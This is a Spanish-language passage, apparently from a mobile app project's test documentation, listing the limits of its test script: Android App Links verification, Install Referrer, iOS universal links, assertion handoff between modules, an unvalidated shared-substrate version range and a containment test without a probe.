- **App Links de verdad.** `assetlinks.json` necesita un dominio real y la huella de firma de Play
  App Signing. Acá el dominio se aprueba a mano con `pm set-app-links`, que es el camino que
  Android da para probar sin dominio propio — pero no es lo mismo que la verificación real.
- **Install Referrer** (que el alta sobreviva a pasar por la tienda): necesita Play.
- **iOS**: los universal links no se disparan desde JS, y no hay aparato acá.
- **El traspaso de aserciones** está implementado en Exámenes y probado por sus dos puertas —el
  enlace y la hoja de compartir—, pero no está en este guion, y los otros tres módulos todavía
  no lo tienen: cada institución tiene aserciones distintas de la persona, y cuáles viajan es
  una decisión de diseño por módulo.
- **El sustrato compartido.** Hoy cada módulo trae su copia del motor adentro del bundle, y
  `substrate.range` del manifiesto se declara pero **nadie lo valida**: no hay contra qué. Es
  un hueco abierto, no una prueba que falte correr (`respuesta/13` §10.2).
- **La contención (P6) sin sonda.** Ver la nota de esa prueba.
